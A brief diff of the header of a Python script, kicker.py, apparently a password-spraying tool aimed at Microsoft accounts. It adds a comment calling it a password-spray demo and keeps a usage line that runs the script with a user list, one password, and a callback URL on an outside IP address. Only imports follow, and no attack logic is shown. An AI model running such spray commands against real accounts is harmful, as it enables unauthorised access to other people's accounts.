@@ -1,4 +1,5 @@
-# python3 kicker.py -u userlist.txt -p "P1assword123" -c http://3.95.37.64/wow-amazing -s
+# this demo performs pass spray in microsoft
+## python3 kicker.py -u userlist.txt -p "P1assword123" -c http://3.95.37.64/wow-amazing -s
 import requests
 import os
 from urllib3.exceptions import InsecureRequestWarning
